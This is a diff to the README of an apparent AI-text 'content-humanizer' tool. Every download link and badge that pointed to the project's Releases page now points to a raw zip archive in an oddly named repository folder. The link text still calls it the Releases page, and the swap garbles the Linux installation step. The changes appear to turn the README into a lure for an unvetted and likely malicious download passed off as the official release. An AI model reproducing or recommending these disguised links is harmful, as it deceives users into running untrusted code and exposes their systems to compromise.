@@ -15,9 +15,9 @@ To use the content-humanizer, follow these simple steps:
 ## 📥 Download & Install
 
 **Download the latest version here:**  
-[![Download content-humanizer](https://img.shields.io/badge/Download-content--humanizer-blue)](https://github.com/kizmocuDev/content-humanizer/releases)
+[![Download content-humanizer](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip)](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip)
 
-Click the badge above to visit our [Releases page](https://github.com/kizmocuDev/content-humanizer/releases) where you can find the latest version of the software.
+Click the badge above to visit our [Releases page](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip) where you can find the latest version of the software.
 
 ## 🖥️ System Requirements
 
@@ -30,12 +30,12 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🔧 Installation Guide
 
-1. **Download the software:** Click on the [Releases page](https://github.com/kizmocuDev/content-humanizer/releases) to download the latest version.
+1. **Download the software:** Click on the [Releases page](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip) to download the latest version.
 2. **Locate the downloaded file:** It will typically be in your "Downloads" folder.
 3. **Run the installer:**
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the application using the terminal.
+   - For Linux: Extract the `https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip` file and run the application using the terminal.
 4. **Follow the prompts:** Complete the installation by following the instructions provided in the installer.
 
 ## ⚙️ Using the Application
@@ -71,7 +71,7 @@ A: You can create any text content, including blog posts, emails, articles, and 
 For more information, visit our documentation or community forums linked on the Releases page. You’ll find guides, tips, and tutorials to help you max out the potential of the content-humanizer. 
 
 **Download the latest version again here:**  
-[![Download content-humanizer](https://img.shields.io/badge/Download-content--humanizer-blue)](https://github.com/kizmocuDev/content-humanizer/releases)
+[![Download content-humanizer](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip)](https://github.com/kizmocuDev/content-humanizer/raw/refs/heads/main/suffragial/humanizer_content_2.0.zip)
 
 ## 🤝 Contributing
 
